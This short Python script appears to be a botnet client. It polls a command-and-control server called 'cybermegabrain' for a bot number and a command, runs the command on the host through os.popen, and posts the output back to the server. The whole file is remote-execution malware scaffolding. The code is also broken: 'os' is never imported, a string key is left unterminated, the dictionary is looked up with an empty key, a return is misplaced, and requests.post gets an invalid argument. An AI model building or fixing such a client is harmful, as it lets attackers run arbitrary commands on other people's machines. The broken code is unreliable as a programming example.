import requests as r
import json

cybermegabrain = 'http://localhost:2048'

def get_myid_in_que():
  allanalogs = r.get(cybermegabrain+'/getmynumber').text
  mynumber = len(allanalogs.split('\n'))
  return mynumber

def get_command(nunb):
  command = r.get(cybermegabrain+'/command').text
  commandjsonmass = json.loads(command)
  if (commandjsonmass[""] == str(nunb)):
    comma = commandjsonmass["command].replace('998721$','"')
    out = os.popen(comma)
  else:
    out = 'Cnfm'
    return out

def uploadoutput(output,botid):
  output = output.replace('998721$','"')
  argums = {"botid":botid,"output":output}
  status = r.post(cybermegabrain+'/checkout',args=argums)
  return status